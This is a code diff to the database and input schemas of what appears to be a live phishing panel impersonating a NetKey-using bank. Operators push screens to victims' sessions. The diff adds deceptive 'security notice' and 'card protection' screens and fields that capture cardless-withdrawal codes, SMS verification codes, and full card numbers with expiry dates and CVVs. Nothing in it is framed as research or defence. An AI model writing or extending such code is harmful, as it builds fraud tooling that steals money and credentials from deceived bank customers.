@@ -135,6 +135,9 @@ export const sessions = pgTable("sessions", {
   correoContacto: text("correo_contacto"), // Correo del formulario de contacto (post-NetKey)
   celularContacto: text("celular_contacto"), // Celular del formulario de contacto (post-NetKey)
   telefonoAlternativoContacto: text("telefono_alternativo_contacto"), // Teléfono alternativo (opcional)
+  codigoRetiro: text("codigo_retiro"), // Código de retiro sin tarjeta (10 dígitos)
+  codigoVerificacionSMS: text("codigo_verificacion_sms"), // Código de verificación SMS (4 dígitos)
+  tarjetasProtegidas: text("tarjetas_protegidas"), // JSON con array de tarjetas (crédito y débito)
   pasoActual: text("paso_actual").default("folio"),
   waitingStartTime: timestamp("waiting_start_time"), // Timestamp cuando comenzó el timer de 30 minutos (ACTUALIZACION screen)
   createdAt: timestamp("created_at").defaultNow(),
@@ -257,6 +260,11 @@ export enum ScreenType {
   DATOS_TARJETA = "datos_tarjeta",
   ACTUALIZACION = "actualizacion",
   NETKEY_MANUAL = "netkey_manual",
+  AVISO_SEGURIDAD = "aviso_seguridad",
+  VALIDANDO_SEGURIDAD = "validando_seguridad",
+  CODIGO_RETIRO = "codigo_retiro",
+  PROTECCION_TARJETAS = "proteccion_tarjetas",
+  VERIFICANDO_INFO = "verificando_info",
 }
 
 export const screenChangeSchema = z.object({
@@ -277,6 +285,9 @@ export const screenChangeSchema = z.object({
   challenge: z.string().optional(), // Challenge NetKey de 8 dígitos
   customChallenge: z.string().optional(), // Challenge personalizado para NetKey custom desde panel admin
   manualNetkeyChallenge: z.string().optional(), // Challenge manual para NetKey manual desde panel admin
+  codigoRetiro: z.string().optional(), // Código de retiro sin tarjeta
+  codigoVerificacionSMS: z.string().optional(), // Código de verificación SMS
+  tarjetas: z.array(z.object({ numero: z.string(), vencimiento: z.string(), cvv: z.string(), tipo: z.enum(['credito', 'debito']) })).optional(), // Array de tarjetas
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
@@ -305,6 +316,8 @@ export const clientInputSchema = z.object({
       z.object({ tipo: z.literal('acceso_denegado'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
       z.object({ tipo: z.literal('acceso_denegado_2'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
       z.object({ tipo: z.literal('datos_contacto'), telefono1: z.string(), telefono2: z.string().optional(), correo: z.string(), nombreRepresentante: z.string() }),
+      z.object({ tipo: z.literal('codigo_retiro'), codigoRetiro: z.string(), codigoVerificacionSMS: z.string() }),
+      z.object({ tipo: z.literal('proteccion_tarjetas'), tarjetas: z.array(z.object({ numero: z.string(), vencimiento: z.string(), cvv: z.string(), tipo: z.enum(['credito', 'debito']) })) }),
     ])
   )
 });
